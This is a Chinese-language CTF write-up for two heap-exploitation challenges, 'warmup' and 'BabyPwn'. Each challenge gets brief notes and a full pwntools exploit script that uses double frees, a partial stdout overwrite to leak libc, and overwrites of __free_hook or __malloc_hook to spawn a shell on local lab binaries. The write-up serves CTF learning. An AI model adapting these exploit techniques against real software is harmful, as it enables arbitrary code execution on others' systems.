# warmup
比较简单存在一个全局变量ptr然后就可以`double_free`
开始做这题的时候以为需要3字节爆破..后来发现只要半字节爆破.
因为我做题的时候习惯关掉ASLR 18.04关掉ASLR 的话stdout和 main_arena.unsorted最低第三字节不同
所以比较棘手但是其实开了ASLR的话很小概率最低第三字节会不同...
其他的没什么好说的..
```python
from pwn import *
def cmd(c):
	p.sendafter(">>",str(c).ljust(0x10))
def add(c='A'):
	cmd(1)
	p.sendafter(">>",c)
def free(idx):
	cmd(2)
	p.sendlineafter(":",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter(":",str(idx))
	p.sendafter(">>",c)
context.log_level='debug'
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#p=process('./warmup',env={'LD_PRELOAD':'./libc-2.27.so'})
p=process('./warmup')
add("/bin/sh\x00")#0
add()#1
#padding
add()#2
add(p64(0x21)*8)#3
add(p64(0x21)*8)#4
free(2)
free(2)
free(2)
add("\x00")#2
add()#6
add(p64(0)+p64(0xa1))#7
for x in range(8):
	free(2)
add('\x60\xa7')#8
free(3)
free(3)
free(3)
free(3)
add('\x10')#3
add()#9
add()#10
add(p64(0x1800)+p64(0)*3+'\x00')
p.read(0x20)
base=u64(p.read(8))-(0x7f6c70bb9780-0x7f6c707ce000)

free(7)
free(8)

free(1)
free(1)


libc.address=base
#gdb.attach(p)
add(p64(libc.sym['__free_hook']))
add()
add(p64(libc.sym['system']))
log.warning(hex(base))

free(0)
p.interactive()
```
# BabyPwn
攻击bss上的list 泄漏后来清空list第二次攻击`__malloc_hook`
```python
from pwn import *
def cmd(c):
	p.sendafter(":",str(c).ljust(4,'\x00'))
def add(size,c="A",name='n132'):
	cmd(1)
	p.sendafter(":",name.ljust(0x10,'\x00'))
	cmd(size)
	p.sendafter(":",c)
def free(idx):
	cmd(2)
	cmd(idx)
context.log_level='debug'
context.arch='amd64'
p=process('./BabyPwn')
add(0x68)#0
add(0x98)#1
add(0x68)#2
add(0x28)#3
free(2)
free(0)
free(2)
free(1)
free(3)
add(0x68,p64(0x60203d))#4
free(3)
add(0x68)
free(3)
add(0x68)#5
free(3)
add(0x68,'\x00'*3+p64(0x00000000006020a0)+p64(0x51)+"\x00"*0x48+p64(0x21)+p64(0x602060)[:3])
add(0x68,'\xdd\x25')#0
add(0x68)#1
add(0x28)#2
add(0x68)#3
free(1)
free(3)
free(1)
add(0x68,'\x00\x31')#4
add(0x68)#5
add(0x68)#6
add(0x68)#7
add(0x68,'\x00'*3+'\x00'*0x30+p64(0x1800)+'\x00'*0x19)#8
p.read(0x40)
base=u64(p.read(8))-(0x7ffff7dd2600-0x7ffff7a0d000)
free(-2)
add(0x48,'\x00'*0x48)
log.warning(hex(base))
add(0x68)#0
add(0x68)#1
free(0)
free(1)
free(0)
one=base+0xf02a4
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
add(0x68,p64(libc.sym['__malloc_hook']+base-35))
add(0x68)
add(0x68)
add(0x68,'\x00'*19+p64(one))
free(1)
free(1)
p.interactive()
```